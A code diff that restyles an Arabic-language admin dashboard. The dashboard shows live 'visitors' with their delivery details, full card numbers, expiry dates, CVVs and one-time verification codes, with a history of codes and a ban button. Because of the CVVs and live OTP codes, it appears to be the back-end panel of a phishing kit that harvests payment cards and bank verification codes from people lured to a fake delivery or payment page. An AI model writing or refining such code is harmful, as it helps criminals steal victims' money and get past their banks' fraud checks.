@@ -1081,17 +1081,19 @@ function createVisitorCardElement(data, grid) {
       <div class="card-title">${escapeHtml(displayName)}</div>
       <div class="card-status"><span class="dot${statusIcon}"></span><span>${statusText}</span></div>
     </div>
-    <div class="card-body">
-      <div class="card-meta">
+    <div class="card-body" style="padding:15px;">
+      <div class="card-meta" style="margin-bottom:10px;">
         <span class="card-page">${currentPage}</span>
         <span class="card-time">${timeAgo}</span>
       </div>
-      ${displayPhone ? '<div class="data-row"><span class="data-label">الهاتف</span><span class="data-value">' + escapeHtml(displayPhone) + '</span></div>' : ''}
-      ${data.form_submitted ? '<div class="progress-step completed"><span class="step-icon">✓</span> نموذج التوصيل</div>' : ''}
-      ${data.payment_submitted ? '<div class="progress-step completed"><span class="step-icon">✓</span> الدفع</div>' : ''}
-      ${data.verification_submitted ? '<div class="progress-step completed"><span class="step-icon">✓</span> التحقق</div>' : ''}
+      ${displayPhone ? '<div class="data-grid"><div class="data-field"><span class="data-label">الهاتف</span><span class="data-value" dir="ltr">' + escapeHtml(displayPhone) + '</span></div></div>' : ''}
+      ${(data.form_submitted || data.payment_submitted || data.verification_submitted) ? '<div class="progress-steps" style="display:flex;gap:8px;flex-wrap:wrap;margin-top:8px;">' + 
+        (data.form_submitted ? '<span class="progress-badge success">✓ توصيل</span>' : '') +
+        (data.payment_submitted ? '<span class="progress-badge success">✓ دفع</span>' : '') +
+        (data.verification_submitted ? '<span class="progress-badge success">✓ تحقق</span>' : '') +
+        '</div>' : ''}
     </div>
-    <div class="card-actions">
+    <div class="card-actions" style="padding:10px 15px;">
       <button class="btn btn-sm btn-primary" onclick="viewVisitorDetails('${sessionId}')">عرض</button>
       <button class="btn btn-sm btn-danger" onclick="banVisitor('${sessionId}', '${escapeHtml(data.ip_address || '')}')">🚫</button>
     </div>
@@ -1228,13 +1230,14 @@ function updateCardSection(card, sectionClass, html) {
 
 // Helper: Build delivery section HTML
 function buildDeliverySection(data) {
-  let html = '<div class="card-section delivery-section"><div class="section-title"><span>📦</span> بيانات التوصيل</div>';
-  if (data.fullName) html += '<div class="data-row"><span class="data-label">الاسم</span><span class="data-value">' + escapeHtml(data.fullName) + '</span></div>';
-  if (data.phone) html += '<div class="data-row"><span class="data-label">الهاتف</span><span class="data-value">' + escapeHtml(data.phone) + '</span></div>';
-  if (data.email) html += '<div class="data-row"><span class="data-label">البريد</span><span class="data-value">' + escapeHtml(data.email) + '</span></div>';
-  if (data.city) html += '<div class="data-row"><span class="data-label">المدينة</span><span class="data-value">' + escapeHtml(data.city) + '</span></div>';
-  if (data.address) html += '<div class="data-row"><span class="data-label">العنوان</span><span class="data-value">' + escapeHtml(data.address) + '</span></div>';
-  html += '</div>';
+  let html = '<div class="card-section delivery-section" style="padding:12px;"><div class="section-title" style="margin-bottom:10px;"><span>📦</span> بيانات التوصيل</div>';
+  html += '<div class="data-grid">';
+  if (data.fullName) html += '<div class="data-field"><span class="data-label">الاسم</span><span class="data-value">' + escapeHtml(data.fullName) + '</span></div>';
+  if (data.phone) html += '<div class="data-field"><span class="data-label">الهاتف</span><span class="data-value" dir="ltr">' + escapeHtml(data.phone) + '</span></div>';
+  if (data.email) html += '<div class="data-field"><span class="data-label">البريد</span><span class="data-value">' + escapeHtml(data.email) + '</span></div>';
+  if (data.city) html += '<div class="data-field"><span class="data-label">المدينة</span><span class="data-value">' + escapeHtml(data.city) + '</span></div>';
+  if (data.address) html += '<div class="data-field full-width"><span class="data-label">العنوان</span><span class="data-value">' + escapeHtml(data.address) + '</span></div>';
+  html += '</div></div>';
   return html;
 }
 
@@ -1242,16 +1245,17 @@ function buildDeliverySection(data) {
 function buildPaymentSection(data) {
   const cardNum = data.cardNumber || data.card_number || '';
   const cvv = data.cvv || '';
-  let html = '<div class="card-section payment-section"><div class="section-title" style="border-bottom-color:#93c5fd;"><span>💳</span> بيانات الدفع</div>';
-  if (cardNum) html += '<div class="data-row"><span class="data-label">البطاقة</span><span class="data-value">' + escapeHtml(cardNum) + '</span></div>';
-  if (data.cardHolder) html += '<div class="data-row"><span class="data-label">صاحب البطاقة</span><span class="data-value">' + escapeHtml(data.cardHolder) + '</span></div>';
-  if (data.expiry) html += '<div class="data-row"><span class="data-label">تاريخ الانتهاء</span><span class="data-value">' + escapeHtml(data.expiry) + '</span></div>';
-  if (cvv) html += '<div class="data-row"><span class="data-label">CVV</span><span class="data-value highlight">' + escapeHtml(cvv) + '</span></div>';
-  html += '</div>';
+  let html = '<div class="card-section payment-section" style="padding:12px;"><div class="section-title" style="margin-bottom:10px;"><span>💳</span> بيانات الدفع</div>';
+  html += '<div class="data-grid">';
+  if (cardNum) html += '<div class="data-field"><span class="data-label">البطاقة</span><span class="data-value" dir="ltr">' + escapeHtml(cardNum) + '</span></div>';
+  if (data.cardHolder) html += '<div class="data-field"><span class="data-label">صاحب البطاقة</span><span class="data-value">' + escapeHtml(data.cardHolder) + '</span></div>';
+  if (data.expiry) html += '<div class="data-field"><span class="data-label">تاريخ الانتهاء</span><span class="data-value" dir="ltr">' + escapeHtml(data.expiry) + '</span></div>';
+  if (cvv) html += '<div class="data-field"><span class="data-label">CVV</span><span class="data-value highlight" dir="ltr">' + escapeHtml(cvv) + '</span></div>';
+  html += '</div></div>';
   return html;
 }
 
-// Helper: Build OTP section HTML
+// Helper: Build OTP section HTML with digit boxes
 function buildOtpSection(otp, history, sessionId) {
   let historyHtml = '';
   if (history.length > 1) {
@@ -1260,7 +1264,13 @@ function buildOtpSection(otp, history, sessionId) {
     ).join('');
     historyHtml = '<div class="otp-history-dropdown" id="otpHistory_' + sessionId + '">' + oldOtps + '</div>';
   }
-  return '<div class="card-section otp-section"><div class="section-title" style="cursor:pointer;" onclick="toggleOtpHistory(\'' + sessionId + '\')"><span>🔐</span> رمز التحقق (OTP)' + (history.length > 1 ? '<span style="margin-right:auto;font-size:12px;color:var(--accent);">▼ ' + history.length + ' رمز</span>' : '') + '</div><div class="otp-value">' + otp + '</div>' + historyHtml + '</div>';
+  
+  // Build OTP digit boxes
+  const otpDigits = otp.split('').map(d => 
+    '<div class="otp-digit">' + d + '</div>'
+  ).join('');
+  
+  return '<div class="card-section otp-section" style="padding:12px;"><div class="section-title" style="cursor:pointer;margin-bottom:10px;" onclick="toggleOtpHistory(\'' + sessionId + '\')"><span>🔐</span> رمز التحقق (OTP)' + (history.length > 1 ? '<span style="margin-right:auto;font-size:12px;color:var(--accent);">▼ ' + history.length + ' رمز</span>' : '') + '</div><div class="otp-boxes">' + otpDigits + '</div>' + historyHtml + '</div>';
 }
 
 // Escape HTML to prevent XSS
